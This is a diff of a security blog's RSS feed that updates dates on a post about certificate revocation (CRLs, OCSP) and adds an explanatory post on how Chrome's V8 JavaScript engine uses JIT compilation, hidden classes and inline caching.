@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Higher Bytes by bt3</title><link>http://bt3gl.github.io/</link><description></description><atom:link href="http://bt3gl.github.io/feeds/all.rss.xml" rel="self"></atom:link><lastBuildDate>Sun, 02 Nov 2014 04:20:00 -0500</lastBuildDate><item><title>On CRLs, OCSP, and a Short Review of Why Revocation Checking Doesn't Work (for Browsers)</title><link>http://bt3gl.github.io/on-crls-ocsp-and-a-short-review-of-why-revocation-checking-doesnt-work-for-browsers.html</link><description>&lt;p&gt;Today we are going to talk about some regulation details of a &lt;strong&gt;SSL/TLS connection&lt;/strong&gt;. For starters, &lt;strong&gt;X.509&lt;/strong&gt; is an &lt;a href="http://en.wikipedia.org/wiki/ITU-T"&gt;ITU-T&lt;/a&gt; standard that specifies standard formats for things such as &lt;em&gt;public key certificates&lt;/em&gt; and &lt;em&gt;certificate revocation lists&lt;/em&gt;.&lt;/p&gt;
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Higher Bytes by bt3</title><link>http://bt3gl.github.io/</link><description></description><atom:link href="http://bt3gl.github.io/feeds/all.rss.xml" rel="self"></atom:link><lastBuildDate>Mon, 03 Nov 2014 04:20:00 -0500</lastBuildDate><item><title>On CRLs, OCSP, and a Short Review of Why Revocation Checking Doesn't Work (for Browsers)</title><link>http://bt3gl.github.io/on-crls-ocsp-and-a-short-review-of-why-revocation-checking-doesnt-work-for-browsers.html</link><description>&lt;p&gt;Today we are going to talk about some regulation details of a &lt;strong&gt;SSL/TLS connection&lt;/strong&gt;. For starters, &lt;strong&gt;X.509&lt;/strong&gt; is an &lt;a href="http://en.wikipedia.org/wiki/ITU-T"&gt;ITU-T&lt;/a&gt; standard that specifies standard formats for things such as &lt;em&gt;public key certificates&lt;/em&gt; and &lt;em&gt;certificate revocation lists&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;A &lt;strong&gt;public key certificate&lt;/strong&gt; is  how websites bind their identity to a &lt;em&gt;public key&lt;/em&gt; to allow  an encrypted session (SSL/TLS) with the user. The certificate includes information about the key, the owner's &lt;em&gt;identity&lt;/em&gt; (such as the DNS name), and the &lt;em&gt;digital signature&lt;/em&gt; of the entity that issued the certificate (the &lt;a href="http://en.wikipedia.org/wiki/Certificate_authority"&gt;Certificate Authority&lt;/a&gt;, also known as CA).  As a consequence, browsers and other &lt;a href="http://en.wikipedia.org/wiki/User_agent"&gt;user-agents&lt;/a&gt; should always be able to check the authenticity of these certificates before proceeding.&lt;/p&gt;
 &lt;p&gt;Some organizations need SSL/TLS simply for confidentiality (encryption), while other organizations use it to enhance trust in their security and identity. Therefore, there are varying levels of verification that a CA may do, ranging from just confirming the control of the domain name (&lt;em&gt;Domain Validation&lt;/em&gt;, DV) to more extensive identity checks (&lt;em&gt;Extended Validation&lt;/em&gt;, EV). For instance, if a site's DNS gets hijacked, while the attacker could be able to issue a controlled DV, she wouldn't be able to issue new EV certificates  just with domain validation.&lt;/p&gt;
 &lt;p&gt;Since EV certificates can be valid for two years and DV certificates for up to three years, they might lose their validity before they expire by age.  For instance, the website can lose control of its key or, as recently in the event of the &lt;a href="http://heartbleed.com/"&gt;Heartbleed bug&lt;/a&gt;, a very large number of SSL/TLS websites needed to revoke and reissue their certificates. Therefore, the need for an efficient revocation machinery is evident.&lt;/p&gt;
@@ -59,7 +59,125 @@
 &lt;p&gt;&lt;a href="https://www.isecpartners.com/media/17919/revocation-whitepaper_pdf__2_.pdf"&gt;Fixing Revocation for Web Browsers, iSEC Partners&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://wiki.mozilla.org/images/e/e3/SSLcertRevocation.pdf"&gt;Proposal for Better Revocation Model of SSL Certificates&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.ssllabs.com/ssltest/"&gt;SSL Server Test&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.digicert.com/help/"&gt;SSL Certificate Checker&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3</dc:creator><pubDate>Sun, 02 Nov 2014 04:20:00 -0500</pubDate><guid>tag:bt3gl.github.io,2014-11-02:on-crls-ocsp-and-a-short-review-of-why-revocation-checking-doesnt-work-for-browsers.html</guid><category>CRL</category><category>CRLSets</category><category>OCSP</category><category>TLS</category></item><item><title>A List of Common Web Vulnerabilities</title><link>http://bt3gl.github.io/a-list-of-common-web-vulnerabilities.html</link><description>&lt;p&gt;Although nomenclatures don't help  much when you facing a security problem, I am keeping this list here for some useful organization. It is constantly been updated.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.digicert.com/help/"&gt;SSL Certificate Checker&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3</dc:creator><pubDate>Mon, 03 Nov 2014 04:20:00 -0500</pubDate><guid>tag:bt3gl.github.io,2014-11-03:on-crls-ocsp-and-a-short-review-of-why-revocation-checking-doesnt-work-for-browsers.html</guid><category>CRL</category><category>CRLSets</category><category>OCSP</category><category>TLS</category></item><item><title>A Closer Look at Chrome's Security I: Understanding V8</title><link>http://bt3gl.github.io/a-closer-look-at-chromes-security-i-understanding-v8.html</link><description>&lt;p&gt;&lt;a href="http://googlechromereleases.blogspot.com/2008_09_01_archive.html"&gt;In 2008, Google released a sandbox-oriented browser&lt;/a&gt;, made mostly from scratch (except that it borrowed rendering machinery from the open-source  &lt;a href="https://www.webkit.org/"&gt;Webkit layout engine&lt;/a&gt;, and later, from &lt;a href="http://en.wikipedia.org/wiki/Blink_(layout_engine)"&gt;Blink&lt;/a&gt;).  Six years later, Chrome has became the preferred browser for &lt;a href="http://en.wikipedia.org/wiki/Google_Chrome"&gt;half of users in the Internet&lt;/a&gt;. This is enough reason to investigate further how security is dealt in this engine. With this motivation in mind, I summarize the main features of Chrome and its &lt;a href="http://www.chromium.org/Home"&gt;Chromium Project&lt;/a&gt;, describing the pristine way of processing JavaScript with the &lt;strong&gt;V8 engine&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2&gt;They way computer used to talk...&lt;/h2&gt;
+&lt;p&gt;In mainstream computer languages, a source code can either be &lt;strong&gt;compiled&lt;/strong&gt; or &lt;strong&gt;interpreted&lt;/strong&gt; (&lt;a href="https://www.youtube.com/watch?v=_C5AHaS1mOA"&gt;a very simple concept...&lt;/a&gt;).&lt;/p&gt;
+&lt;h3&gt;Compilers and Interpreters&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Compilers&lt;/strong&gt;  produce  an intermediate form called &lt;strong&gt;object code&lt;/strong&gt;, which is like machine code but augmented with symbols tables  to make executable blocks (library files, with file objects). A linker is used to finally combine them to form executables.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Interpreters&lt;/strong&gt; execute instructions without compiling into machine language first. They can either parse and execute the instructions (&lt;em&gt;e.g.&lt;/em&gt; Lisp), translate into intermediate representation such as &lt;strong&gt;bytecode&lt;/strong&gt; (&lt;em&gt;e.g.&lt;/em&gt; Java, &lt;a href="http://akaptur.com/blog/2013/11/17/introduction-to-the-python-interpreter-3/"&gt;Python&lt;/a&gt;) or &lt;strong&gt;abstract syntax trees&lt;/strong&gt; or ASTs (&lt;em&gt;e.g.&lt;/em&gt; Ruby),  or store precompiled code by a compiler (&lt;em&gt;e.g.&lt;/em&gt; Pascal).&lt;/p&gt;
+&lt;p&gt;Choosing the way you compile or interpret your code is similar as deciding the speed you want things to run. Since browsers are preoccupied in deliver content the faster they can,  this is a fundamental choice.&lt;/p&gt;
+&lt;p&gt;In traditional JavaScript machineries, code is represented by bytecode or AST and then executed in a &lt;em&gt;virtual machine&lt;/em&gt; or further compiled into machine code. To speed things up, instead of being parsed and then executed (&lt;a href="http://en.wikipedia.org/wiki/Ahead-of-time_compilation"&gt;one at time&lt;/a&gt;),  &lt;strong&gt;dynamic translators&lt;/strong&gt;  (&lt;em&gt;Just-in-time&lt;/em&gt; translators, or JIT) are used. JITs &lt;em&gt;translate intermediate representation into machine language  at runtime&lt;/em&gt;. It has the efficiency of running native code with the cost of startup time plus increased memory (when the bytecode or AST are first compiled).&lt;/p&gt;
+&lt;h3&gt;Method JITs and Tracing JITs&lt;/h3&gt;
+&lt;p&gt;Engines have different policies on code generation, which can roughly be grouped into types: &lt;strong&gt;tracing&lt;/strong&gt; and &lt;strong&gt;method&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Method JITs&lt;/strong&gt; emit native code for every block (method) of code and update references dynamically. Method JITs can implement an &lt;em&gt;inline cache&lt;/em&gt; for rewriting type lookups at runtime.&lt;/p&gt;
+&lt;p&gt;In &lt;strong&gt;tracing JITs&lt;/strong&gt;, native code is only emitted when a certain block (method) is considered &lt;em&gt;important&lt;/em&gt;. An example is given by traditional JavaScript: if you load a script with functions that are never used, they are never compiled. Additionally, in JavaScript a  &lt;em&gt;cache&lt;/em&gt; is usually implemented due to the nature of its &lt;em&gt;dynamic typing system&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;The reason I am telling these things is &lt;strong&gt;V8&lt;/strong&gt; changes all the rules. As we will see below, V8 performs direct JIT compilation from source code to machine code without bytecode and using inline cache. But let's not get ahead of ourselves!&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;The way JavaScript used to be...&lt;/h2&gt;
+&lt;p&gt;JavaScript's integration with &lt;a href="http://en.wikipedia.org/wiki/Netscape_Navigator"&gt;Netscape Navigator&lt;/a&gt; in the mid-90s made it easier for developers to access HTML page elements such as &lt;em&gt;forms&lt;/em&gt;, &lt;em&gt;frames&lt;/em&gt;, and &lt;em&gt;images&lt;/em&gt;. This was essential for JavaScript's accession for being the most popular scripting engine for the web.&lt;/p&gt;
+&lt;p&gt;JavaScript's high dynamically behavior (that I'm briefly discussing below) came with a price: in the mid-2000s browsers had very slow JavaScript implementations that did not scale with code size or &lt;em&gt;object allocation&lt;/em&gt;. Issues such as &lt;em&gt;memory leaks&lt;/em&gt; when running web apps were becoming mainstream. It was clear that things would only get worse and a new JavaScript engine was a must.&lt;/p&gt;
+&lt;h3&gt;JavaScript Structure&lt;/h3&gt;
+&lt;p&gt;In JavaScript, every object has a &lt;em&gt;prototype&lt;/em&gt;, and the prototype is also an object. All JavaScript objects inherit their properties and methods from their prototype.&lt;/p&gt;
+&lt;p&gt;So, for example, supposing an application that has an object &lt;em&gt;Point&lt;/em&gt; (borrowed from the &lt;a href="https://developers.google.com/v8/design"&gt;official documentation&lt;/a&gt;):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Point&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can create several objects:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Point&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Point&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And we can access the propriety &lt;code&gt;x&lt;/code&gt; in these object by:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the above implementation, we would have two different Point objects that do not share any structure. This is because JavaScript is &lt;em&gt;classless&lt;/em&gt;: you create  new objects on the fly and dynamically add or remove proprieties. Functions can move from an object to another. Objects with same type can appear in the same sites in the program with no constraints.&lt;/p&gt;
+&lt;p&gt;Furthermore, to store their object proprieties, most JavaScript engines use a &lt;em&gt;dictionary-like data structure&lt;/em&gt;. Each property access demands a dynamic lookup to resolve their location in memory. This is opposed as &lt;em&gt;static&lt;/em&gt; languages such Java, where instance variables are located at fixed offsets determined by the compiler (due to the &lt;em&gt;fixed&lt;/em&gt; object layout by the &lt;em&gt;object's class&lt;/em&gt;). In this case, access is given by a simple memory load or store (a single instruction).&lt;/p&gt;
+&lt;h3&gt;JavaScript Garbage Collection&lt;/h3&gt;
+&lt;p&gt;The core design flaw of traditional JavaScript engines is &lt;strong&gt;bad garbage collection behavior&lt;/strong&gt;.  Garbage collection is a form of &lt;em&gt;automatic memory management&lt;/em&gt;: the attempt of reclaiming memory occupied by objects that are not being used any longer.&lt;/p&gt;
+&lt;p&gt;The other possibility is &lt;em&gt;manual memory management&lt;/em&gt;, which requires the developer to specify which objects need to be deallocated. However, manual garbage collection can result in bugs such as:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;Dangling&lt;/span&gt; &lt;span class="n"&gt;pointers&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;when&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;piece&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;freed&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;there&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;still&lt;/span&gt; &lt;span class="n"&gt;pointers&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;Double&lt;/span&gt; &lt;span class="n"&gt;free&lt;/span&gt; &lt;span class="n"&gt;bugs&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;when&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt; &lt;span class="n"&gt;tries&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;free&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;region&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;had&lt;/span&gt; &lt;span class="n"&gt;already&lt;/span&gt; &lt;span class="n"&gt;freed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt; &lt;span class="n"&gt;leaks&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;when&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt; &lt;span class="n"&gt;fails&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;free&lt;/span&gt; &lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="n"&gt;occupied&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;had&lt;/span&gt; &lt;span class="n"&gt;became&lt;/span&gt; &lt;span class="n"&gt;unreachable&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;leading&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="n"&gt;exhaustion&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;On the flip side, JavaScript has automatic memory management. If an object loses its reference, the object's memory is reclaimed in by the virtual machine. The problem is that JavaScript engines do not know exactly where all the pointers are and they will search through the entire execution stack to see which data looks like pointers (for instance, integers can look like a pointer to an address in the heap).&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Introducing V8&lt;/h2&gt;
+&lt;p&gt;A solution for the issues presented above came from Google,  with  the &lt;strong&gt;V8 Engine&lt;/strong&gt;. V8 is an &lt;a href="https://code.google.com/p/v8/"&gt;open source JavaScript engine&lt;/a&gt; written in C++ that gave birth to Chrome. V8 has a way to categorize the highly-dynamic JavaScript objects into classes, bringing techniques from static class-based languages. In addition, as I mentioned in the the beginning, V8 compiles JavaScript to native machine code before executing it.&lt;/p&gt;
+&lt;p&gt;In terms of performance, besides direct compilation to native code, three main features in V8 are fundamental:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;Hidden&lt;/span&gt; &lt;span class="n"&gt;classes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;In&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="n"&gt;caching&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;optimization&lt;/span&gt; &lt;span class="n"&gt;technique&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;Efficient&lt;/span&gt; &lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="n"&gt;management&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;garbage&lt;/span&gt; &lt;span class="n"&gt;collection&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Let's take a look at each of them.&lt;/p&gt;
+&lt;h3&gt;V8's Hidden Class&lt;/h3&gt;
+&lt;p&gt;In V8, as execution goes on, objects that end up with the same properties will share the same &lt;strong&gt;hidden class&lt;/strong&gt;. This way the engine  applies dynamic optimizations.&lt;/p&gt;
+&lt;p&gt;Consider the Point example from before: we have two different objects, &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt;. Instead of having them completely independent, V8 makes them share a hidden class. So instead of creating two objects, we have &lt;em&gt;three&lt;/em&gt;. The hidden class shows that both objects have the same proprieties and an object changes its hidden class when a new property is added.&lt;/p&gt;
+&lt;p&gt;So, for our example, if another Point object is created:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Initially the Point object has no properties so the newly created object refers to the initial class &lt;strong&gt;C0&lt;/strong&gt;. The value is stored at offset zero of  the Point object.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;When property &lt;code&gt;x&lt;/code&gt; is added, V8 follows the hidden class transition from &lt;strong&gt;C0&lt;/strong&gt; to &lt;strong&gt;C1&lt;/strong&gt; and writes the value of &lt;code&gt;x&lt;/code&gt; at the offset specified by &lt;strong&gt;C1&lt;/strong&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;When property &lt;code&gt;y&lt;/code&gt; is added, V8 follows the hidden class transition from &lt;strong&gt;C1&lt;/strong&gt; to &lt;strong&gt;C2&lt;/strong&gt; and writes the value of &lt;code&gt;y&lt;/code&gt; at the offset specified by &lt;strong&gt;C2&lt;/strong&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Instead of having a generic lookup for a propriety, V8  generates an efficient machine code to search the propriety. The machine code generated for accessing &lt;code&gt;x&lt;/code&gt; is something like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;# ebx = the point object&lt;/span&gt;
+&lt;span class="n"&gt;cmp&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;class&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;cached&lt;/span&gt; &lt;span class="n"&gt;class&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="n"&gt;jne&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kr"&gt;inline&lt;/span&gt; &lt;span class="n"&gt;cache&lt;/span&gt; &lt;span class="n"&gt;miss&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="n"&gt;mv&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;cached&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Instead of a complicated lookup at the propriety, V8 reading the propriety translates into three machine operations!&lt;/p&gt;
+&lt;p&gt;It might seem inefficient to create a new hidden class whenever a property is added. However, because of the class transitions the hidden classes can be reused several times. It turns out that most of the access to objects are within the same hidden class.&lt;/p&gt;
+&lt;h3&gt;V8's In-line caching&lt;/h3&gt;
+&lt;p&gt;When the engine runs the code, it does not know about the hidden class. V8 optimizes property access by predicting that the class will also be used for all future objects accessed in the same section of code, and uses the information to the &lt;strong&gt;inline cache code&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Inline caching is a class-based object-oriented optimization technique employed by some language runtimes.  The concept of inline caching is based on the  observation that the objects that occur at a particular call site are often of the same type. Therefore, performance can be increased by storing the result of a method lookup &lt;em&gt;inline&lt;/em&gt; (at the call site).&lt;/p&gt;
+&lt;p&gt;If V8 has predicted correctly the property's value is assigned in a single operation. If the prediction is incorrect, V8 patches the code to remove the optimization. To facilitate this process, call sites are assigned different states:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;Unitilized&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Initial&lt;/span&gt; &lt;span class="n"&gt;state&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;never&lt;/span&gt; &lt;span class="n"&gt;seem&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;Pre&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;monomorphic&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Behave&lt;/span&gt; &lt;span class="n"&gt;like&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;uninitialized&lt;/span&gt; &lt;span class="n"&gt;but&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;one&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt; &lt;span class="n"&gt;lookup&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;we&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;customized&lt;/span&gt; &lt;span class="n"&gt;monophorfic&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;It&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="n"&gt;special&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="n"&gt;executed&lt;/span&gt; &lt;span class="n"&gt;only&lt;/span&gt; &lt;span class="n"&gt;once&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initialization&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
+
+&lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;Monomphorpic&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Very&lt;/span&gt; &lt;span class="n"&gt;fast&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Recoded&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;hidden&lt;/span&gt; &lt;span class="n"&gt;class&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="n"&gt;already&lt;/span&gt; &lt;span class="n"&gt;seem&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="mf"&gt;4.&lt;/span&gt; &lt;span class="n"&gt;Megamorphic&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;It&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;like&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;initialized&lt;/span&gt; &lt;span class="n"&gt;stub&lt;/span&gt; &lt;span class="n"&gt;since&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;always&lt;/span&gt; &lt;span class="n"&gt;does&lt;/span&gt; &lt;span class="n"&gt;runtime&lt;/span&gt; &lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;except&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;never&lt;/span&gt; &lt;span class="n"&gt;replaces&lt;/span&gt; &lt;span class="n"&gt;itself&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
